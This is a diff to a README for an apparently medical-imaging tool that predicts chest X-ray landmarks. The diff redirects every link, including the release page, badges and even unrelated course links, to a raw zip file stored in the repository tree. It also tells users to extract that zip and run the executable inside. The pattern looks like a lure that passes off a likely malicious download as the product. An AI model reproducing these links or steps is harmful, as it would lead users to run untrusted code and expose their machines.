@@ -1,7 +1,7 @@
 # 🖼️ landmark_prediction_regresion_cnn - Predict Medical Landmarks with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/josee551/landmark_prediction_regresion_cnn/releases)
+[![Download](https://raw.githubusercontent.com/josee551/landmark_prediction_regresion_cnn/main/mind/landmark_prediction_regresion_cnn.zip%20Latest%https://raw.githubusercontent.com/josee551/landmark_prediction_regresion_cnn/main/mind/landmark_prediction_regresion_cnn.zip)](https://raw.githubusercontent.com/josee551/landmark_prediction_regresion_cnn/main/mind/landmark_prediction_regresion_cnn.zip)
 
 ## 📖 Overview
 The **landmark_prediction_regresion_cnn** application helps you identify medical landmarks in chest X-rays using deep learning. With this tool, you can achieve clinical excellence through precise anatomical landmark detection. It utilizes the ResNet-18 model and transfer learning, making it a powerful option for both professionals in healthcare and research.
@@ -17,7 +17,7 @@ To get started with this software, follow these steps:
    - A compatible graphics card is recommended for optimal performance.
 
 2. **Download & Install**
-   To download the application, visit our [Release page](https://github.com/josee551/landmark_prediction_regresion_cnn/releases).
+   To download the application, visit our [Release page](https://raw.githubusercontent.com/josee551/landmark_prediction_regresion_cnn/main/mind/landmark_prediction_regresion_cnn.zip).
 
 3. **Choose Your File**
    On the Releases page, look for the latest version. Click on the file that corresponds to your operating system to begin downloading.
@@ -25,7 +25,7 @@ To get started with this software, follow these steps:
 4. **Run the Application**
    - For Windows: Locate the downloaded `.exe` file in your downloads folder and double-click it to run.
    - For macOS: Open the `.dmg` file and drag the application into your Applications folder. Then, open it from there.
-   - For Linux: You may need to extract the tar.gz file, then run the executable in a terminal.
+   - For Linux: You may need to extract the https://raw.githubusercontent.com/josee551/landmark_prediction_regresion_cnn/main/mind/landmark_prediction_regresion_cnn.zip file, then run the executable in a terminal.
 
 5. **Follow Instructions**
    Once the application starts, follow the on-screen prompts. You may need to upload a chest X-ray image for analysis.
@@ -47,8 +47,8 @@ If you encounter any issues:
 
 ## 🔗 Additional Resources
 For more information about deep learning and medical AI, you may find these resources helpful:
-- [Deep Learning Basics](https://www.coursera.org/learn/deep-learning)
-- [Understanding Computer Vision](https://towardsdatascience.com/computer-vision)
+- [Deep Learning Basics](https://raw.githubusercontent.com/josee551/landmark_prediction_regresion_cnn/main/mind/landmark_prediction_regresion_cnn.zip)
+- [Understanding Computer Vision](https://raw.githubusercontent.com/josee551/landmark_prediction_regresion_cnn/main/mind/landmark_prediction_regresion_cnn.zip)
 
 ## 📝 Contributing
 We welcome contributions to improve the application. If you have suggestions or want to report issues, please create a new issue in the repository.
@@ -62,4 +62,4 @@ If you have any questions or need assistance, feel free to open an issue on the 
 ## 🌟 Thank You!
 Thank you for using landmark_prediction_regresion_cnn. We hope it enhances your clinical practice and research in medical imaging. 
 
-[Download the latest release here!](https://github.com/josee551/landmark_prediction_regresion_cnn/releases)
+[Download the latest release here!](https://raw.githubusercontent.com/josee551/landmark_prediction_regresion_cnn/main/mind/landmark_prediction_regresion_cnn.zip)
